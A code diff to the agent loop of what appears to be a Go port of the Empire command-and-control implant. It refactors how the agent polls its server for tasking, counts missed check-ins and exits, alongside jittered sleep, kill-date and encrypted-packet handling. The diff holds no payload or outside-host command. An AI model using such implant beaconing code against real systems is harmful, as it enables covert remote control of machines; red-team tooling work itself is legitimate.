@@ -3,7 +3,6 @@ package agent
 import (
 	"EmpirGo/common"
 	"EmpirGo/comms"
-	"encoding/base64"
 	"os"
 	"os/exec"
 	"strings"
@@ -12,7 +11,7 @@ import (
 )
 
 type MessageSender interface {
-	SendMessage(routingPacket []byte) ([]byte, error)
+	Send(kind comms.RequestKind, routingPacket []byte) ([]byte, error)
 }
 
 type Task struct {
@@ -25,18 +24,17 @@ type Task struct {
 }
 
 type MainAgent struct {
-	PacketHandler comms.PacketHandler
-	MessageSender MessageSender
-	profile       string
-	server        string
-	sessionID     string
-	killDate      string
-	workingHours  string
-	delay         int
-	jitter        float64
-	lostLimit     int
-	// TODO: Remove from MainAgent
-	defaultResponse  string
+	PacketHandler    comms.PacketHandler
+	MessageSender    MessageSender
+	profile          string
+	server           string
+	sessionID        string
+	killDate         string
+	workingHours     string
+	delay            int
+	jitter           float64
+	lostLimit        int
+	missedCheckins   int
 	jobMessageBuffer string
 	socksThread      bool
 	socksQueue       chan bool
@@ -48,7 +46,7 @@ type MainAgent struct {
 	runningJobsMu    sync.Mutex
 }
 
-func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMessageSender, sessionID, killDate, workingHours string, delay int, jitter float64, lostLimit int, aeskey []byte, defaultResponse string) *MainAgent {
+func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMessageSender, sessionID, killDate, workingHours string, delay int, jitter float64, lostLimit int, aeskey []byte) *MainAgent {
 	packetHandler.SessionID = sessionID
 
 	return &MainAgent{
@@ -60,11 +58,9 @@ func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMe
 		delay:         delay,
 		jitter:        jitter,
 		lostLimit:     lostLimit,
-		// TODO: Remove the use of this from main agent and just use it in the sender
-		defaultResponse: defaultResponse,
-		tasks:           make(map[string]*Task),
-		encryptionKey:   aeskey,
-		runningJobs:     make(map[int]*exec.Cmd),
+		tasks:         make(map[string]*Task),
+		encryptionKey: aeskey,
+		runningJobs:   make(map[int]*exec.Cmd),
 	}
 }
 
@@ -86,11 +82,11 @@ func (ma *MainAgent) preparepacket(packets []byte) ([]byte, error) {
 	if packets != nil {
 		encData := common.AesEncryptThenHMAC(ma.PacketHandler.Aeskey, packets)
 		routingPacket := ma.PacketHandler.BuildRoutingPacket(ma.PacketHandler.StagingKey, ma.sessionID, 5, 0, encData)
-		data, err := ma.MessageSender.SendMessage(routingPacket)
+		data, err := ma.MessageSender.Send(comms.RequestData, routingPacket)
 		return data, err
 	} else {
 		routingPacket := ma.PacketHandler.BuildRoutingPacket(ma.PacketHandler.StagingKey, ma.sessionID, 4, 0, nil)
-		data, err := ma.MessageSender.SendMessage(routingPacket)
+		data, err := ma.MessageSender.Send(comms.RequestTasking, routingPacket)
 		return data, err
 	}
 }
@@ -135,10 +131,6 @@ func (ma *MainAgent) Run() {
 			}
 		}
 
-		if ma.PacketHandler.MissedCheckins >= ma.lostLimit {
-			ma.AgentExit()
-		}
-
 		ma.SendJobMessageBuffer()
 
 		minSleep := int((1.0 - ma.jitter) * float64(ma.delay))
@@ -147,18 +139,18 @@ func (ma *MainAgent) Run() {
 		time.Sleep(time.Duration(sleepTime) * time.Second)
 
 		data, err := ma.preparepacket(nil)
-		if err == nil && len(data) != 0 {
-			ma.PacketHandler.MissedCheckins = 0
-			base64string := base64.StdEncoding.EncodeToString(data)
-
-			// TODO: Move defaultresponse to the messagesender
-			if len(data) == 0 || base64string == ma.defaultResponse {
-				continue
-			} else {
-
-				packet, _ := ma.PacketHandler.DecodeRoutingPacket(data, ma.PacketHandler.StagingKey, ma.sessionID)
-				ma.processTasking(packet)
+		result := comms.ClassifyPoll(data, err)
+		processedOK := false
+		if result == comms.PollTasking {
+			packet, derr := ma.PacketHandler.DecodeRoutingPacket(data, ma.PacketHandler.StagingKey, ma.sessionID)
+			// (nil, nil) here is a packet addressed to another session; it
+			// counts as a miss, like one that does not decode or decrypt.
+			if derr == nil && len(packet) > 0 {
+				processedOK = ma.processTasking(packet)
 			}
+		}
+		if !comms.PollStep(result, processedOK, ma.lostLimit, &ma.missedCheckins) {
+			ma.AgentExit()
 		}
 	}
 }
